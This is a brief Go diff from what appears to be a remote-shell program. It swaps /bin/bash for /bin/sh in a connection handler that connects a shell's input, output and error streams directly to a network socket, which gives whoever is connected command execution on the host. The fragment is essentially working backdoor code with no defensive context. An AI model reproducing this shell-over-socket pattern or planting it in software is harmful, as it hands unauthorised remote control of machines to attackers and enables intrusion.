@@ -17,7 +17,7 @@ func bhandleConnection(connection net.Conn) {
 		fmt.Println("Something went wrong trying to write to the connection:", err)
 	}
 
-	cmd := exec.Command("/bin/bash")
+	cmd := exec.Command("/bin/sh")
 	cmd.Stdin = connection //connection pointer is dereferenced to retrieve the connection data
 	cmd.Stdout = connection
 	cmd.Stderr = connection
